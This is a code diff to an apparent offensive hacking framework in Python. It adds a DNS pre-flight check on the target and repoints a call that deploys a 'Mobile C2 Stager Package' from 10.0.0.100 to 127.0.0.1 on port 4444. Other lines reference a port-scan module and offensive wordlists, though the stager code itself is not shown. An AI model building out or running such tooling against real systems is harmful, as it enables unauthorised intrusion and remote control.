@@ -2,6 +2,7 @@ import asyncio
 import sys
 import time
 import random
+import socket
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
 from modules.scanner import run_port_scanner             # <--- New Recon Module
@@ -46,6 +47,23 @@ def cyber_print(text, delay=0.01, color=MATRIX_GREEN):
     sys.stdout.flush()
     sys.stdout.write("\033[1S")
 
+def validate_target_host(target_domain):
+    """
+    Pre-flight DNS & reachability check to prevent blind execution 
+    against dead domains or invalid wildcard resolutions.
+    """
+    print(f"\n{CYAN}[PRE-FLIGHT] → Resolving target domain: {target_domain}{RESET}")
+    try:
+        ip = socket.gethostbyname(target_domain)
+        if ip in ["0.0.0.0"] and "localhost" not in target_domain:
+            print(f"       └── {RED}[!] FATAL: Target resolved to unroutable IP ({ip}). Aborting pipeline.{RESET}")
+            return False, ip
+        print(f"       └── {GREEN}[SUCCESS] Target verified -> Resolved IP: {ip}{RESET}")
+        return True, ip
+    except socket.gaierror as e:
+        print(f"       └── {RED}[!] DNS RESOLUTION ERROR: Could not resolve '{target_domain}': {e}{RESET}")
+        return False, None
+
 async def async_main():
     sys.stdout.write("\033[2J\033[H")
     print(BANNER)
@@ -64,8 +82,14 @@ async def async_main():
         target = target[8:]
     target = target.split('/')[0].split(':')[0]
 
+    # Enforce Pre-Flight Verification Gate
+    is_valid, resolved_ip = validate_target_host(target)
+    if not is_valid:
+        cyber_print(f"{RED}[ABORT] Pre-flight target gate failed. Exiting framework safely.{RESET}", 0.01)
+        sys.exit(1)
+
     # Clean block-tree structured output for target isolation
-    print(f"\n{CYAN}[TARGET 1/1] → https://{target}{RESET}")
+    print(f"\n{CYAN}[TARGET 1/1] → https://{target} ({resolved_ip}){RESET}")
     print(f"       └── [STATUS] Target isolated and locked successfully.")
     
     cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
@@ -163,7 +187,7 @@ async def async_main():
         
     # 4. Deploy Mobile C2 Stager Package
     try:
-        deploy_c2_stager("10.0.0.100", 4444)
+        deploy_c2_stager("127.0.0.1", 4444)
     except Exception:
         pass
 
@@ -186,3 +210,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
